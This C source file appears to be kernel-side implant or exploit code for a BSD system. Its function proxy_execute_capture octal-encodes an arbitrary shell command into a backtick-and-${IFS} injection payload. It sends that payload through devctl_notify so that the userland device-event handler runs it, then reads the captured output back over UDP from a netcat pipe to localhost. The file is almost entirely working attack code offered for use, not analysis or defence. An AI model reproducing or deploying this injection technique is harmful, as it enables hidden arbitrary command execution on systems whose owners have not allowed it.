#include "config.h"
#include "shellproxy.h"
#include "rand.h"
#include <sys/libkern.h>

#if defined(__has_include)
# if __has_include("dd_conf.h")
#  include "dd_conf.h"
# endif
#endif

static
int strip_end_marker (u8* buf, int len)
{
	int endlen = (int)sizeof(CN_END)-1;

	if (len<endlen || memcmp(buf+len-endlen, CN_END, endlen)!=0)
		return (len);
	return (len-endlen);
}

#ifdef DD_CONF_H
int proxy_execute_capture (struct remconn* rc, const char* cmd, u8* out, int outsz)
{
	char full[1100];
	char blob[1024];
	char payload[1400];
	u8* dgram;
	int n = 0;
	int got = 0;
	int truncated = 0;

	dgram = malloc(65536, M_TEMP, M_WAITOK);

	snprintf(full, sizeof(full), "( %.*s 2>&1; printf '%%s' '%s' ) | " "nc -u -w 1 127.0.0.1 %u", (int)strcspn(cmd, "\n"), cmd, CN_END, OUTPORT);

	for (const char*p = full; *p!='\0' && n<(int)sizeof(blob)-5; p++)
		n += snprintf(blob+n, sizeof(blob)-n, "\\%03o", (unsigned char)*p);

	snprintf(payload, sizeof(payload), "x}`printf${IFS}'%s'|sh`", blob);
	devctl_notify("IFNET", payload, "ATTACH", NULL);
	proxy_attr_start();

	rem_timeout(rc, 2);
	for (;;) {
		n = rem_recv_dgram(rc, dgram, 65536);
		if (n<=0)
			break;
		n = strip_end_marker(dgram, n);
		if (n<=0)
			break;
		// uhhh
		if (got + n > outsz) {
			n = outsz-got;
			truncated = 1;
		}
		if (n<=0)
			break;
		memcpy(out+got, dgram, n);
		got += n;
		if (got>=outsz) {
			truncated = 1;
			break;
		}
	}
	if (truncated) {
		// i fucking give up just truncate for now
		rem_timeout(rc, 1);
		while (rem_recv_dgram(rc, dgram, 65536)>0)
			;
	}
	free(dgram, M_TEMP);
	return (got);
}
#endif
